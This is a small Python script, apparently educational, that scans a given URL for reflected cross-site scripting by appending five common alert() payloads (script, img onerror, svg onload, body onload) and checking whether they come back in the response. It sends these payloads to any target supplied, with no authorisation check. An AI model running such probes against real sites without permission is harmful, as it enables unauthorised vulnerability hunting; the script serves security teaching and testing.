import requests
import sys

print("""
========================================
      ETHICAL CYBER LAB - XSS SCANNER
========================================
Educational Cross-Site Scripting tester
Author: Divine Sunday OFUOWOICHO
========================================
""")

# XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>"
]

if len(sys.argv) != 2:
    print("Usage: python3 xss_test.py <target_url>")
    print("Example: python3 xss_test.py http://testphp.vulnweb.com/search.php?test=")
    sys.exit()

url = sys.argv[1]

print(f"\n[+] Testing target: {url}\n")

for payload in payloads:

    test_url = url + payload

    try:
        response = requests.get(test_url, timeout=5)

        if payload in response.text:
            print("[!] Possible XSS vulnerability detected!")
            print(f"[!] Payload: {payload}")
            print(f"[!] URL: {test_url}\n")

    except requests.exceptions.RequestException:
        print("[-] Connection error")

print("\nScan complete.")
